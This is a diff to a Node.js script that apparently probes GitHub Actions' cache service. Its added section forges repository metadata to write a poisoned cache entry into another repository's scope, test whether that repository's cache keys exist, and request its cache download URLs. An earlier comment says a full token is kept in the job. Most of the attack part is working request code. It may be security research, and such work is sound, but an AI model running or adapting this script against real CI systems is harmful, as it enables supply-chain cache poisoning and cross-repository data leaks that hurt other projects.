@@ -1,5 +1,6 @@
 const fs = require('fs');
 const https = require('https');
+const crypto = require('crypto');
 const env = process.env;
 
 // [1] env surface dump (token redacted in console, full token kept in-job only)
@@ -124,6 +125,34 @@ function call(url, method, headers, body) {
     console.log('id=' + aid + ' (' + tag + '):', r.status, r.body.slice(0, 160));
     await new Promise(res => setTimeout(res, 1000));
   }
+  // [6] metadata injection experiments (E1 poison / E2 existence oracle / E3 query-side)
+  const B_REPO = '1359323551';
+  const VER_OFFICIAL = crypto.createHash('sha256').update('seed-official|gzip|1.0').digest('hex');
+  console.log('== [6] metadata injection ==');
+  const FAKE_META = { repositoryId: B_REPO, scope: [{ scope: 'Actions.Results:00000000-0000-0000-0000-000000000000:00000000-0000-0000-0000-000000000000', permission: '3' }] };
+  const rp1 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
+    JSON.stringify({ metadata: FAKE_META, key: 'poison-b-1', version: VER }));
+  console.log('E1 poison create (fake meta):', rp1.status, rp1.body.slice(0, 160));
+  let purl = '';
+  try { purl = JSON.parse(rp1.body).signedUploadUrl || ''; } catch (e) {}
+  if (purl) {
+    const blob = Buffer.from('poison-payload-19');
+    const rp2 = await call(purl, 'PUT', { 'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(blob.length) }, blob);
+    console.log('E1 poison upload:', rp2.status);
+    const rp3 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', 'POST', ORC,
+      JSON.stringify({ metadata: FAKE_META, key: 'poison-b-1', version: VER, sizeBytes: String(blob.length) }));
+    console.log('E1 poison finalize:', rp3.status, rp3.body.slice(0, 160));
+  }
+  const ro = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
+    JSON.stringify({ metadata: { repositoryId: B_REPO }, key: 'official-b-1', version: VER_OFFICIAL }));
+  console.log('E2 probe official-b-1 (fake meta):', ro.status, ro.body.slice(0, 170),
+    ro.status === 409 ? ' <<<B-SCOPE-KEY-EXISTENCE LEAKED' : ro.status === 200 ? ' <<<metadata ignored (landed in A scope)' : '');
+  const rc2 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
+    JSON.stringify({ key: 'official-b-1-control', version: VER_OFFICIAL }));
+  console.log('E2 control (no meta):', rc2.status, rc2.body.slice(0, 120));
+  const rq = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
+    JSON.stringify({ metadata: { repositoryId: B_REPO }, key: 'official-b-1', version: VER_OFFICIAL, restoreKeys: [] }));
+  console.log('E3 A-token get official-b-1 w/ B meta:', rq.status, rq.body.slice(0, 170));
   fs.writeFileSync('reports/oracle-final.txt', 'done');
   console.log('ORACLE FINAL DONE');
 })().catch(e => { console.error('FATAL', e); process.exit(1); });
